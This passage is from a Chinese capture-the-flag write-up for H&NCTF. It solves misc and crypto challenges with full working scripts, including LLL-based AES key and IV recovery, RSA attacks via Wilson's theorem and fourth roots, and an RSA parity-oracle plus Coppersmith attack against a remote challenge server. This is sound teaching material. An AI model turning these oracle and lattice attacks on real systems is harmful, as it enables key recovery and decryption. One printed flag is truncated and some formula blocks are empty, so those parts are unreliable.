先按 GBK 解码成文本，再按 Big5/CP950 编码，最后 base64：

```python
from pathlib import Path
import base64

jpg = Path("beautiful00txt64key.jpg").read_bytes()
tail = jpg[jpg.rfind(b"\xff\xd9") + 2:]

data = tail[1:]  # 去掉开头 00
s = data.decode("gbk")
password = base64.b64encode(s.encode("cp950")).decode()

print(password)
```

得到压缩包密码：

```c++
46ZA90za2w==
```

用这个密码解压 amazing\.zip，得到二维码图片 qrcode\.png。扫描二维码内容为：

```c++
c3PKPIMc09gpvNaLzzxqN8INOPDePTBFVjQfQEjVtYp5isZO37ZWWcvTXcyeqAEWJ
```

![Image](./images/img-108.png)

这串看起来像 base64，但长度是 65，len % 4 == 1，不是合法 base64。再结合题目名“base玩明白了”和前面的密码：

```c++
46ZA90za2w==
```

把密码倒过来看：

```c++
==w2az09AZ64
```

其中 az09AZ 提示 base62 字母表顺序：

```c++
abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ
```

64 提示 base62 解完后还要 base64

于是对二维码内容按这个字母表做 base62 解码：

```c++
import base64

qr = "c3PKPIMc09gpvNaLzzxqN8INOPDePTBFVjQfQEjVtYp5isZO37ZWWcvTXcyeqAEWJ"
alphabet = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"

v = 0
for ch in qr:
      v = v * 62 + alphabet.index(ch)

b64 = v.to_bytes((v.bit_length() + 7) // 8, "big")
print(b64.decode())

flag = base64.b64decode(b64).decode()
print(flag)
```

H\&NCTF\{th0\_miscS\_flAg\_arE\_beAutifUl\}

## 题目名称：签到

解题人：weixiao

解题思路：

进入微信公众号推文，查看留言

![Image](./images/img-109.png)

base64解码

![Image](./images/img-110.png)

拿到flag

```text
H&NCTF{LinfengYun_360SRC_Haobachang_SHunFengAnquanSFSRC_Hacking_Group_HG_0434}
```

## 题目名称：问卷调查

解题人：J4toPos

解题思路：

填写问卷即可

![Image](./images/img-111.png)

```text
H&NCTF{hd0dwd0csidjinugvd0dmiji6dsim0od0oOdusO0u9}
```

# Crypto

## 题目名称：lush foliage

解题人：weixiao

解题过程：

题目把 `flag` 作为随机字符表：

- `key`：从 `flag` 字符集合中随机选 16 个字符；

- `iv`：同样从 `flag` 字符集合中随机选 16 个字符；

- `hint1 = bytes_to_long(key)`；

- `hint2`：再从 `flag` 字符集合中随机选 16 个字符，且满足 `gcd(hint1, hint2)=1`；

- 输出 `hint1 ^ hint2` 与 `hint1 * hint2`；

- 对 30 组随机 64\-bit 系数 `a,b`，只输出高 32 位 `A=a>>32, B=b>>32`，并输出

```python
C = (a*hint1^2 + b*hint2^2 + iv)^2 mod (hint1*hint2)
```

最后用 `AES-CBC(key, iv)` 加密 flag。

**由 product 和 xor 恢复 ****`hint1/hint2`**

已知

```python
x = hint1 ^ hint2
n = hint1 * hint2
```

逐 bit 枚举两个数当前位，并检查低 `k+1` 位乘积是否等于 `n mod 2^(k+1)`。因为 xor 固定每一位只有两种情况，乘积低位会快速剪枝。最后得到两组候选：`(hint1,hint2)` 和交换顺序。

**利用模 ****`hint2`**** / 模 ****`hint1`**** 消去一半项**

令 `a=(A<<32)+x_i`，`b=(B<<32)+y_i`，其中 `x_i,y_i < 2^32`。

对模 `hint2`：

```python
C_i = ((A_i<<32)*hint1^2 + x_i*hint1^2 + iv)^2 mod hint2
```

因为 `b*hint2^2` 在模 `hint2` 下为 0。对模 `hint1` 同理：

```python
C_i = ((B_i<<32)*hint2^2 + y_i*hint2^2 + iv)^2 mod hint1
```

这就是题目提示里的 “What is left when the high ones fall?”：输出的高 32 位留下了主项，低 32 位成为小未知量。

**用平方根分支 \+ 区间交集过滤**

以模 `hint2` 为例，设

```python
m = hint1^2 mod hint2
w = iv * m^(-1) mod hint2
```

每个平方根 `r` 都满足：

```python
x_i = (r - (A_i<<32)*m - iv) * m^(-1) mod hint2
```

而真实的 `x_i < 2^32`，所以每个根都会给 `w` 一个长度为 `2^32` 的环上区间。30 组数据求交后，错误平方根分支基本都会被排除。

模 `hint1` 对 `y_i` 做同样处理。

**LLL 恢复精确 IV**

过滤后通常只剩极少数组合。把模 `hint1` 和模 `hint2` 的平方根 CRT 合成完整根 `root`，有

```python
root - (A<<32)*hint1^2 - (B<<32)*hint2^2 = x***hint1^2 + y*hint2^2 + iv      mod hint1*hint2
```

也就是

```python
x*hint1^2 + y*hint2^2 + iv - D = k*(hint1*hint2)
```

其中 `x,y,k` 约 32 bit，`iv` 约 128 bit。构造 4x5 小格：

```python
[ hint1^2, S, 0, 0, 0 ]
[ hint2^2, 0, S, 0, 0 ]
[ -N,      0, 0, S, 0 ]
[ -D,      0, 0, 0, M ]
```

取 `S=2^128/2^32=2^96, M=2^128`，LLL 后短向量形如：

```python
[-iv, x*S, y*S, k*S, M]
```

从而得到精确 IV。

**AES\-CBC 解密**

`hint1` 就是 AES key。恢复 `key` 与 `iv` 后，对 `ciphertext` 做 AES\-CBC 解密并去 PKCS\#7 padding 即可得到 flag。

`exp.py`：

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Requirements: pip install pwntools pycryptodome sympy

import ast
import re
from fractions import Fraction

from pwn import remote, context
from Crypto.Cipher import AES
from sympy.ntheory.residue_ntheory import sqrt_mod

HOST = "114.66.24.210"
PORT = ...
NBITS = 128
LOW = 1 << 32
VBOUND = 1 << 128

context.log_level = "error"


def i2b(x: int, n: int = 16) -> bytes:
    return int(x).to_bytes(n, "big")


def int_to_ct(x: int) -> bytes:
    raw = int(x).to_bytes(max(1, (int(x).bit_length() + 7) // 8), "big")
    return raw.rjust(((len(raw) + 15) // 16) * 16, b"\x00")


def unpad_pkcs7(data: bytes) -> bytes:
    if not data:
        raise ValueError("empty plaintext")
    k = data[-1]
    if k < 1 or k > 16 or data[-k:] != bytes([k]) * k:
        raise ValueError("bad padding")
    return data[:-k]


def parse_output(s: str):
    def grab(name):
        m = re.search(rf"{re.escape(name)}=([^\n]+)", s)
        if not m:
            raise ValueError(f"missing {name}")
        return m.group(1).strip()

    A = ast.literal_eval(grab("A[]"))
    B = ast.literal_eval(grab("B[]"))
    C = ast.literal_eval(grab("C[]"))
    ciphertext = int(grab("ciphertext"))
    hx = int(grab("hint1^hint2"))
    hn = int(grab("hint1*hint2"))
    return A, B, C, ciphertext, hx, hn


def recover_xor_product(x: int, n: int, nbits: int = NBITS):
    *"""Recover the two 128-bit factors from product and xor by bit DP."""*
*    *cand = [(0, 0)]
    for k in range(nbits):
        xb = (x >> k) & 1
        opts = ((0, 0), (1, 1)) if xb == 0 else ((0, 1), (1, 0))
        mask = (1 << (k + 1)) - 1
        target = n & mask
        nxt = []
        for a, b in cand:
            for ak, bk in opts:
                aa = a | (ak << k)
                bb = b | (bk << k)
                if (aa * bb) & mask == target:
                    nxt.append((aa, bb))
        cand = nxt
    return [(a, b) for a, b in cand if a * b == n and (a ^ b) == x]


# ---------- tiny exact LLL, enough for the 4x5 lattice in this challenge ----------

def _gs(B):
    n, m = len(B), len(B[0])
    Bstar = [[Fraction(0) for _ in range(m)] for __ in range(n)]
    mu = [[Fraction(0) for _ in range(n)] for __ in range(n)]
    norm = [Fraction(0) for _ in range(n)]
    for i in range(n):
        v = list(map(Fraction, B[i]))
        for j in range(i):
            if norm[j] == 0:
                continue
            mu[i][j] = sum(Fraction(B[i][k]) * Bstar[j][k] for k in range(m)) / norm[j]
            for k in range(m):
                v[k] -= mu[i][j] * Bstar[j][k]
        Bstar[i] = v
        norm[i] = sum(t * t for t in v)
    return mu, norm


def _nearest(q: Fraction) -> int:
    z = q.numerator // q.denominator
    r = q - z
    if r > Fraction(1, 2):
        z += 1
    if r < -Fraction(1, 2):
        z -= 1
    return z


def lll(B, delta=Fraction(3, 4)):
    B = [list(map(int, row)) for row in B]
    k = 1
    mu, norm = _gs(B)
    while k < len(B):
        for j in range(k - 1, -1, -1):
            q = _nearest(mu[k][j])
            if q:
                B[k] = [B[k][i] - q * B[j][i] for i in range(len(B[0]))]
                mu, norm = _gs(B)
        if norm[k] >= (delta - mu[k][k - 1] * mu[k][k - 1]) * norm[k - 1]:
            k += 1
        else:
            B[k], B[k - 1] = B[k - 1], B[k]
            mu, norm = _gs(B)
            k = max(k - 1, 1)
    return B


# ---------- interval filtering for modular square-root branches ----------

def merge_intervals(intervals):
    if not intervals:
        return []
    intervals = sorted(intervals)
    out = [list(intervals[0])]
    for l, r in intervals[1:]:
        if l <= out[-1][1] + 1:
            out[-1][1] = max(out[-1][1], r)
        else:
            out.append([l, r])
    return [tuple(x) for x in out]


def circular_interval(base: int, length: int, mod: int):
    # inclusive interval [base-length+1, base] on Z_mod
    l = (base - length + 1) % mod
    r = base % mod
    if l <= r:
        return [(l, r)]
    return [(0, r), (l, mod - 1)]


def intersect_intervals(a, b):
    i = j = 0
    out = []
    while i < len(a) and j < len(b):
        l = max(a[i][0], b[j][0])
        r = min(a[i][1], b[j][1])
        if l <= r:
            out.append((l, r))
        if a[i][1] < b[j][1]:
            i += 1
        else:
            j += 1
    return out


def possible_w_intervals(modulus: int, m: int, highs, C):
    *"""*
*    For c = ((hi<<32)*m + low*m + iv)^2 mod modulus,*
*    let w = iv * m^{-1}.  Each root gives an interval for w.*
*    """*
*    *inv_m = pow(m, -1, modulus)
    cur = [(0, modulus - 1)]
    rootlists = []

    for hi, ci in zip(highs, C):
        roots = list(map(int, sqrt_mod(ci % modulus, modulus, all_roots=True)))
        rootlists.append(roots)
        K = ((hi << 32) * m) % modulus
        union = []
        for r in roots:
            base = ((r - K) * inv_m) % modulus
            union.extend(circular_interval(base, LOW, modulus))
        union = merge_intervals(union)
        cur = merge_intervals(intersect_intervals(cur, union))
        if not cur:
            break
    return cur, rootlists


def root_survivors_for_sample0(modulus: int, m: int, hi0: int, c0: int, final_intervals):
    inv_m = pow(m, -1, modulus)
    K = ((hi0 << 32) * m) % modulus
    ans = []
    for r in map(int, sqrt_mod(c0 % modulus, modulus, all_roots=True)):
        base = ((r - K) * inv_m) % modulus
        ints = merge_intervals(circular_interval(base, LOW, modulus))
        if intersect_intervals(ints, final_intervals):
            ans.append(r)
    return ans


def crt2(a: int, m: int, b: int, n: int) -> int:
    return (a + m * (((b - a) * pow(m, -1, n)) % n)) % (m * n)


def solve_iv_from_full_root(h1: int, h2: int, Ai: int, Bi: int, root: int):
    N = h1 * h2
    H1 = h1 * h1
    H2 = h2 * h2
    D = (root - ((Ai << 32) * H1 + (Bi << 32) * H2)) % N

    S = VBOUND // LOW
    M = VBOUND
    # x*H1 + y*H2 + iv - D = k*N
    # x,y,k about 32 bits, iv about 128 bits.
    basis = [
        [H1, S, 0, 0, 0],
        [H2, 0, S, 0, 0],
        [-N, 0, 0, S, 0],
        [-D, 0, 0, 0, M],
    ]

    sols = []
    for vec in lll(basis):
        first, xs, ys, ks, last = vec
        if abs(last) != M or xs % S or ys % S or ks % S:
            continue
        sign = 1 if last == M else -1
        x = sign * xs // S
        y = sign * ys // S
        k = sign * ks // S
        iv = -sign * first
        if 0 <= x < LOW and 0 <= y < LOW and 0 <= iv < VBOUND:
            if x * H1 + y * H2 + iv - D == k * N:
                sols.append(iv)
    return sols


def verify_iv(h1: int, h2: int, A, B, C, iv: int, roots_h1, roots_h2) -> bool:
    H1 = h1 * h1
    H2 = h2 * h2

    for Ai, Bi, ci, r1s, r2s in zip(A, B, C, roots_h1, roots_h2):
        # mod h2 fixes the low 32 bits of coefficient_a
        m = H1 % h2
        inv_m = pow(m, -1, h2)
        K = ((Ai << 32) * m + iv) % h2
        ok = any(((r - K) * inv_m) % h2 < LOW for r in r2s)
        if not ok:
            return False

        # mod h1 fixes the low 32 bits of coefficient_b
        m = H2 % h1
        inv_m = pow(m, -1, h1)
        K = ((Bi << 32) * m + iv) % h1
        ok = any(((r - K) * inv_m) % h1 < LOW for r in r1s)
        if not ok:
            return False
    return True


def recover_iv(h1: int, h2: int, A, B, C):
    H1 = h1 * h1
    H2 = h2 * h2

    int_h2, roots_h2 = possible_w_intervals(h2, H1 % h2, A, C)
    int_h1, roots_h1 = possible_w_intervals(h1, H2 % h1, B, C)
    if not int_h1 or not int_h2:
        return []

    surv_h2 = root_survivors_for_sample0(h2, H1 % h2, A[0], C[0], int_h2)
    surv_h1 = root_survivors_for_sample0(h1, H2 % h1, B[0], C[0], int_h1)

    ivs = []
    for r1 in surv_h1:
        for r2 in surv_h2:
            full_root = crt2(r1, h1, r2, h2)
            for iv in solve_iv_from_full_root(h1, h2, A[0], B[0], full_root):
                if verify_iv(h1, h2, A, B, C, iv, roots_h1, roots_h2):
                    ivs.append(iv)
    return sorted(set(ivs))


def decrypt_flag(key_int: int, iv_int: int, ciphertext_int: int) -> bytes:
    key = i2b(key_int)
    iv = i2b(iv_int)
    ct = int_to_ct(ciphertext_int)
    pt = AES.new(key, AES.MODE_CBC, iv).decrypt(ct)
    return unpad_pkcs7(pt)


def solve(data: str):
    A, B, C, ciphertext, hx, hn = parse_output(data)
    pairs = recover_xor_product(hx, hn)

    results = []
    for h1, h2 in pairs:
        for iv in recover_iv(h1, h2, A, B, C):
            try:
                flag = decrypt_flag(h1, iv, ciphertext)
                # Basic sanity filter; remove it if the flag format is very unusual.
                if all(32 <= c < 127 for c in flag):
                    results.append((flag.decode(), h1, h2, iv))
            except Exception:
                pass
    return results


def main():
    io = remote(HOST, PORT)
    data = io.recvall(timeout=5).decode(errors="ignore")
    print(data)
    ans = solve(data)
    if not ans:
        raise SystemExit("[-] no valid flag found")
    for flag, h1, h2, iv in ans:
        print("[+] flag =", flag)
        print("[+] key  =", i2b(h1))
        print("[+] iv   =", i2b(iv))


if __name__ == "__main__":
    main()

"""
[+] flag = H&NCTF{e1555804fc6e
[+] key = b'cT&N58N5&e0&H08c'
[+] iv = b'55F56408F6c4ec50'
"""
```

H\&NCTF\{e1555804fc6e



## 题目名称：狗熊岭

解题人：J4toPos

解题过程：

题目给出一张图片和一个 Python 加密脚本。脚本中隐藏了 `Sec_Weapon` 和 `flag`，只留下了加密逻辑、`eee` 和 `ciphertext`。

核心代码如下：

```python
Sec_Weapon = "??????????"
flag = "????????????"

m = bytes_to_long(flag.encode())
Sec_Weapon = bytes_to_long(Sec_Weapon.encode())

e = 65537
ee = #??????
eee = ((factorial_n_minus_1(e)) * ee) % e

ciphertext = powmod(m, ee, Sec_Weapon * (e ** 12))

print(f"eee={eee}")
print(f"ciphertext={ciphertext}")

# eee=47580
# ciphertext=382896577643443968472170168897624448214289762811480375301807069031090665207710745899
```

首先对题目图片进行 LSB 隐写检查。分别检查 RGB 三个通道的最低有效位后，发现 **B 通道 LSB** 中存在明显的隐藏头：

```text
HNLSB1
```

继续解析该头部，可以得到隐藏图片的宽高：

```text
width = 400
height = 180
```

说明 B 通道最低位中藏了一张 `400 x 180` 的黑白图片。

提取脚本如下：

```python
from PIL import Image
import numpy as np


def bits_to_bytes(bits):
    data = bytearray()

    for i in range(0, len(bits), 8):
        v = 0
        for b in bits[i:i + 8]:
            v = (v << 1) | int(b)
        data.append(v)

    return bytes(data)


img = Image.open("stego.png").convert("RGB")
arr = np.array(img)

# 取 B 通道最低有效位
bits = (arr[:, :, 2].reshape(-1) & 1).astype(np.uint8)

# 前 14 字节为自定义头部：
# HNLSB1 + 4 字节宽度 + 4 字节高度
header_len = 14 * 8
header = bits_to_bytes(bits[:header_len])

print("[+] Header:", header)

magic = header[:6]
width = int.from_bytes(header[6:10], "big")
height = int.from_bytes(header[10:14], "big")

print("[+] Magic:", magic)
print("[+] Width:", width)
print("[+] Height:", height)

start = header_len
end = start + width * height

hidden_bits = bits[start:end].reshape(height, width)

# 反色后更容易观察文字
hidden_img = Image.fromarray(((1 - hidden_bits) * 255).astype(np.uint8), "L")

# 放大方便查看
hidden_img = hidden_img.resize(
    (width * 8, height * 8),
    Image.Resampling.NEAREST
)

hidden_img.save("hidden.png")
print("[+] Hidden image saved as hidden.png")
```

运行后得到隐藏图片，其中关键提示为：

```text
秘密武器代号：
神原原！原神！神神！神原！神原原原！原原！神神原！神原原原！原！原神！原神原
```

![Image](./images/img-112.png)

可以看作摩斯密码的变形。

设定映射关系：

```text
神 = -
原 = .
```

再以中文感叹号 `！` 分割每一组编码：

```text
神原原     -> -..   -> D
原神       -> .-    -> A
神神       -> --    -> M
神原       -> -.    -> N
神原原原   -> -...  -> B
原原       -> ..    -> I
神神原     -> --.   -> G
神原原原   -> -...  -> B
原         -> .     -> E
原神       -> .-    -> A
原神原     -> .-.   -> R
```

拼接得到：

```text
DAMNBIGBEAR
```

因此可以确定加密脚本中的：

```python
Sec_Weapon = "DAMNBIGBEAR"
```

脚本中给出：

```python
e = 65537
eee = ((factorial_n_minus_1(e)) * ee) % e
```

其中：

```python
factorial_n_minus_1(e) = (e - 1)!
```

由于 `65537` 是素数，根据 Wilson 定理：

```text
(e - 1)! ≡ -1 mod e
```

所以：

```text
eee ≡ -ee mod e
```

题目给出：

```text
eee = 47580
```

因此：

```text
ee ≡ -47580 mod 65537
ee = 17957
```

对应代码：

```python
e = 65537
eee = 47580

ee = (-eee) % e

print(ee)
```

输出：

```text
17957
```

加密代码为：

```python
ciphertext = powmod(m, ee, Sec_Weapon * (e ** 12))
```

所以模数为：

```python
n = bytes_to_long(b"DAMNBIGBEAR") * 65537 ** 12
```

计算：

```text
bytes_to_long(b"DAMNBIGBEAR") = 82515335593625240279007570
```

对其分解：

```text
82515335593625240279007570
= 2 * 3 * 5 * 331 * 8309701469650074549749
```

因此完整模数分解为：

```text
n = 2 * 3 * 5 * 331 * 8309701469650074549749 * 65537^12
```

因为已经知道模数分解，可以计算欧拉函数：

```text
phi(n) = Π (p - 1) * p^(a - 1)
```

然后求私钥指数：

```python
d = inverse(ee, phi)
```

最后解密：

```python
m = pow(ciphertext, d, n)
flag = long_to_bytes(m)
```

完整exp如下：

```python
from math import gcd


def bytes_to_long(b):
    return int.from_bytes(b, "big")


def long_to_bytes(n):
    return n.to_bytes((n.bit_length() + 7) // 8, "big")


e = 65537
eee = 47580

ciphertext = 382896577643443968472170168897624448214289762811480375301807069031090665207710745899

Sec_Weapon = "DAMNBIGBEAR"
Sec_Weapon_num = bytes_to_long(Sec_Weapon.encode())

# Wilson 定理：
# (e - 1)! ≡ -1 mod e
# eee ≡ -ee mod e
ee = (-eee) % e

print("[+] Sec_Weapon =", Sec_Weapon)
print("[+] ee =", ee)

n = Sec_Weapon_num * (e ** 12)

# bytes_to_long(b"DAMNBIGBEAR") 的分解：
# 82515335593625240279007570
# = 2 * 3 * 5 * 331 * 8309701469650074549749
factors = {
    2: 1,
    3: 1,
    5: 1,
    331: 1,
    8309701469650074549749: 1,
    e: 12
}

phi = 1
for p, a in factors.items():
    phi *= (p - 1) * (p ** (a - 1))

if gcd(ee, phi) != 1:
    print("[-] ee 与 phi(n) 不互素，无法直接求逆")
    exit()

d = pow(ee, -1, phi)

m = pow(ciphertext, d, n)
flag = long_to_bytes(m)

print("[+] flag =", flag.decode())
```

运行结果：

![Image](./images/img-113.png)

拿到flag

```text
H&NCTF{The_l4test_l0gging_m4chine}
```

## 题目名称：rsa

解题人：weixiao

题目给出三素数 RSA：

```text
n = p * q * r
```

并泄露：

```text
hint_1 = p^r mod n
hint_2 = r^(s-2) mod n
c = m^(e*(s-1)) mod n
```

由于 `hint_1 = p^r mod n`，而 `n` 中含有因子 `p`，所以：

```text
hint_1 ≡ 0 mod p
```

因此可以直接得到：

```text
p = gcd(hint_1, n)
```

同理，实际数据中 `s > 2`，所以：

```text
hint_2 = r^(s-2) ≡ 0 mod r
```

于是：

```text
r = gcd(hint_2, n)
q = n // p // r
```

至此完成对 `n` 的分解。

然后枚举 `s`：

```text
for i in range(2, 32):
    if pow(r, i - 2, n) == hint_2:
        s = i
        break
```

本题得到：

```text
s = 5
```

令：

```text
k = s - 1
```

则：

```text
c = m^(e*k) mod n
```

这里不能直接求私钥指数，因为：

```text
gcd(e*k, phi) = 4
gcd(k, phi) = 4
```

但 `e = 65537` 与 `phi` 互素，所以可以先消去 `e`：

```text
y = c^(e^-1 mod phi) = m^k mod n
```

又因为 `k = 4 * t` 且 `gcd(t, phi) = 1`，继续消去 `t`：

```text
z = y^(t^-1 mod phi) = m^4 mod n
```

问题转化为求：

```text
m^4 = z mod n
```

由于 `n = pqr`，分别在 `p, q, r` 下开四次根即可。模素数下开四次根可以通过两次 Tonelli\-Shanks 开平方完成。最后枚举三个模数下的根组合，用 CRT 合并回模 `n` 下的候选明文，并根据 flag 格式筛选。

`exp.py`：

```python
from Crypto.Util.number import *
from gmpy2 import gcd, invert
from itertools import product

n = 979979396280795025447159604653924698007421096864863532640467914347154790478966309310242938046375382963295576018108365493749631126829441159428446514913045553768462359812141188437867022522642883215617924930162362975118753135307868195989529952635950471650238440782216155187808858076406173123376307233605251322063056796573051571421373804400742814841380628966244338908899920978345766251241466839953205051967073060065807266111902771444846685228931419177071776202794447

hint_1 = 63829737789015303255616010995430271442615363334005654136790603132124697763248934614727407142426063514798780422988294297457892974476968909011594056992955895743933371737158975962646294428475380486162081880712675820233377927503162194872237855275106302109770193104087596464371630697812485876577638759333868021626793193900551035852971032420289295901322943785198833653840660632317598841581456445704445974646032512822137015643024549120429185146320086905286336984565780

hint_2 = 811225663987535096929418484923252315039418484176390289011682551835727122657404871203738500127970361216735459526184706907379779604453737161603694233134616612209864675829711293451990923072581678837181277865189990566773712777076953922847187456309194004847987239678695437936130991596979472315709241564675102503547056625609492959906116295807701067076200192520193721233660324426348223046220024274205328004516104292752500294107591971181194232357501832617229377939678909

c = 554491127748739273581999967419384543160020010465406113035040735016528899552140169583353294062576591579973382955030891201758740151326341677432402990540380379170704264251101185973670282744523850032981933697291881931773848908998356042585230566838554495089166039238470892330078315451993029959200347825405258393357495512040019534150921164118639093729837315213487083882435472600420840995787008748593481029626822135460873446903992348211665228818922931223995184301813181

e = 0x10001


# -----------------------------
# Tonelli-Shanks 模素数开平方
# -----------------------------
def sqrt_mod_prime(a, p):
    a %= p

    if a == 0:
        return [0]

    # 判断是否为二次剩余
    if pow(a, (p - 1) // 2, p) != 1:
        return []

    # p % 4 == 3 的快速情况
    if p % 4 == 3:
        x = pow(a, (p + 1) // 4, p)
        return list(set([x, (-x) % p]))

    # Tonelli-Shanks
    q = p - 1
    s = 0
    while q % 2 == 0:
        s += 1
        q //= 2

    z = 2
    while pow(z, (p - 1) // 2, p) != p - 1:
        z += 1

    m = s
    c = pow(z, q, p)
    t = pow(a, q, p)
    r = pow(a, (q + 1) // 2, p)

    while t != 1:
        i = 1
        tmp = pow(t, 2, p)
        while tmp != 1:
            tmp = pow(tmp, 2, p)
            i += 1

        b = pow(c, 2 ** (m - i - 1), p)
        m = i
        c = pow(b, 2, p)
        t = t * c % p
        r = r * b % p

    return list(set([r, (-r) % p]))


# -----------------------------
# 模素数开四次根
# x^4 = a mod p
# 做两次开平方即可
# -----------------------------
def fourth_roots_mod_prime(a, p):
    roots = []

    first_roots = sqrt_mod_prime(a, p)
    for y in first_roots:
        second_roots = sqrt_mod_prime(y, p)
        roots.extend(second_roots)

    return list(set(roots))


# -----------------------------
# CRT
# -----------------------------
def crt(residues, moduli):
    M = 1
    for mod in moduli:
        M *= mod

    x = 0
    for a, mod in zip(residues, moduli):
        Mi = M // mod
        inv = int(invert(Mi, mod))
        x += a * Mi * inv

    return x % M


# -----------------------------
# 分解 n
# -----------------------------
p = int(gcd(hint_1, n))
r = int(gcd(hint_2, n))
q = n // p // r

print("[+] p =", p)
print("[+] q =", q)
print("[+] r =", r)

assert p * q * r == n


# -----------------------------
# 爆破 s
# -----------------------------
s = None
for i in range(2, 32):
    if pow(r, i - 2, n) == hint_2:
        s = i
        break

print("[+] s =", s)

phi = (p - 1) * (q - 1) * (r - 1)
k = s - 1

print("[+] gcd(e*k, phi) =", gcd(e * k, phi))
print("[+] gcd(k, phi) =", gcd(k, phi))


# -----------------------------
# 消掉 e
# c = m^(e*k)
# y = c^(e^-1) = m^k
# -----------------------------
de = int(invert(e, phi))
y = pow(c, de, n)

# k = 4 * t
assert gcd(k, phi) == 4
assert k % 4 == 0

t = k // 4
dt = int(invert(t, phi))

# z = y^(t^-1) = m^4
z = pow(y, dt, n)

print("[+] got z = m^4 mod n")


# -----------------------------
# 分别在 p, q, r 下开四次根
# -----------------------------
roots_p = fourth_roots_mod_prime(z, p)
roots_q = fourth_roots_mod_prime(z, q)
roots_r = fourth_roots_mod_prime(z, r)

print("[+] roots mod p:", len(roots_p))
print("[+] roots mod q:", len(roots_q))
print("[+] roots mod r:", len(roots_r))


# -----------------------------
# CRT 合并所有候选
# -----------------------------
mods = [p, q, r]

for rp, rq, rr in product(roots_p, roots_q, roots_r):
    m = crt([rp, rq, rr], mods)
    flag = long_to_bytes(m)
    if b"H&NCTF{" in flag:
        print("[+] possible flag:", flag.decode())
        break
# [+] possible flag: H&NCTF{c0gr4tul4ti0n!!y0u_g0t_it}
```

H\&NCTF\{c0gr4tul4ti0n\!\!y0u\_g0t\_it\}



## 题目名称：rsa pro

解题人：weixiao

解题思路：

题目源码

```python
from Crypto.Util.number import bytes_to_long, getPrime, inverse
from secret import flag

assert len(flag) == 65
assert flag.startswith(b"H&NCTF{") and flag.endswith(b"}")

P_BITS = 512
LEAK_BITS = 256
BRUTE_BITS = 8
LOW_BITS = P_BITS - LEAK_BITS - BRUTE_BITS
HINT_BYTES = LEAK_BITS // 8
HINT_BITS = LEAK_BITS

class RSAByteOracle:
    def __init__(self):
        self.p = getPrime(P_BITS)
        self.q = getPrime(P_BITS)
        self.n = self.p * self.q
        self.e = 65537
        self.d = inverse(self.e, (self.p - 1) * (self.q - 1))
        self.p_high = self.p >> (BRUTE_BITS + LOW_BITS)
        self.cnt = HINT_BITS
        if bytes_to_long(flag) >= self.n:
            raise ValueError("flag is too large for this RSA modulus")
        self.c_hint = self.encrypt(self.p_high)
        self.c = self.encrypt(flag)

    def encrypt(self, m):
        if isinstance(m, bytes):
            m = bytes_to_long(m)
        return pow(m, self.e, self.n)

    def decrypt(self, c):
        if self.cnt <= 0:
            print("No attempts left.")
            return
        c %= self.n
        m = pow(c, self.d, self.n)
        self.cnt -= 1
        print("bit =", m & 1)
        print(f"Attempts remaining: {self.cnt}")

def show_challenge(rsa):
    print("n =", rsa.n)
    print("e =", rsa.e)
    print("c_hint =", rsa.c_hint)
    print("c =", rsa.c)

MENU = """
[RSA Hint Byte Oracle Console]
[1] Decrypt a ciphertext
[2] Show challenge data
[3] Close

Select action > """

if __name__ == "__main__":
    rsa = None
    while True:
        try:
            opt = int(input(MENU))
        except Exception:
            break

        if opt == 1:
            if rsa is None:
                print("Load the challenge data first.")
                continue
            c = int(input("ciphertext >>> "))
            rsa.decrypt(c)
        elif opt == 2:
            if rsa is None:
                print("Challenge ready.")
                rsa = RSAByteOracle()
            show_challenge(rsa)
        elif opt == 3:
            print("Session closed.")
            break
        else:
            print("Unknown selection.")

```

参数关系：

```text
P_BITS   = 512
LEAK_BITS = 256
BRUTE_BITS = 8
LOW_BITS = 512 - 256 - 8 = 248
```

因此：

```text
p_high = p >> (8 + 248) = p >> 256
```

服务端公开：

```text
n
e
c_hint = p_high^e mod n
c      = flag^e mod n
```

并提供最多 256 次解密 oracle，每次只泄露解密结果最低位：

```text
bit = RSA_dec(input_ciphertext) & 1
```

攻击分两步：

1. 利用 LSB oracle 从 `c_hint` 恢复明文 `p_high`。

2. 已知 `p` 高 256 bit，枚举中间 8 bit，用 Coppersmith 恢复低 248 bit，分解 `n`。

**第一步：用 LSB oracle 还原 p\_high**

已知：

```text
c_hint = p_high^e mod n
```

RSA 具有乘法同态：

```text
(a^e mod n) * (b^e mod n) = (ab)^e mod n
```

所以可以构造：

```text

```

服务端解密后得到：

```text

```

oracle 返回：

```text
leak_i = m_i & 1
```

如果直接做普通 RSA parity oracle，一般要大约 `n.bit_length()` 次，也就是约 1024 次；但本题只有 256 次。这里目标不是完整明文，而是 256\-bit 的 `p_high`，可以低位到高位逐 bit 恢复。

设：

```text
x = p_high
```

假设已经恢复了 `x` 的低 `i` 位：

```text
r = x mod 2^i
```

因为 `n` 是奇数，所以 `n` 在模 `2^i` 下可逆。选择一个 `k`，使得：

```text
x + k*n == 0 mod 2^i
```

由于未知高位都是 `2^i` 的倍数，所以只需要用已知低位 `r` 计算：

```text
k = -r * n^{-1} mod 2^i
```

于是：

```text
m_i = x * 2^{-i} mod n
    = (x + k*n) / 2^i
```

把 `x` 展开：

```text
x = r + b_i * 2^i + higher * 2^(i+1)
```

代入：

```text
m_i = (r + k*n) / 2^i + b_i + even_part
```

因此最低位满足：

```text
leak_i = ((r + k*n) >> i & 1) xor b_i
```

所以当前第 `i` bit：

```text
b_i = leak_i xor (((r + k*n) >> i) & 1)
```

**第二步：已知 p 高位后分解 n**

源码中：

```text
p_high = p >> 256
```

也就是 `p` 的结构为：

```text
p = (p_high << 256) + mid * 2^248 + x
```

其中：

```text
mid < 2^8
x   < 2^248
```

`mid` 只有 8 bit，可以直接枚举 0 到 255。对每个 `mid`，令：

```text
base = (p_high << 256) + (mid << 248)
p = base + x
```

因为 `p | n`，所以：

```text
base + x == 0 mod p
```

构造单变量多项式：

```text
f(X) = X + base
```

它在未知因子 `p` 模下有小根 `x`：

```text
f(x) == 0 mod p
```

这里：

```text
n ≈ 2^1024
p ≈ n^0.5
x < 2^248
n^0.25 ≈ 2^256
```

线性多项式、未知因子大小约为 `n^0.5`，Coppersmith/Howgrave\-Graham 可以在 `x < n^0.25` 范围内恢复小根。本题低位未知 248 bit，比理论边界 `2^256` 小 8 bit，刚好可做。

**Howgrave\-Graham 格构造**

取：

```text
X = 2^248
f(x) = x + base
m = 18
t = 19
dim = m + t = 37
```

构造多项式集合：

```text
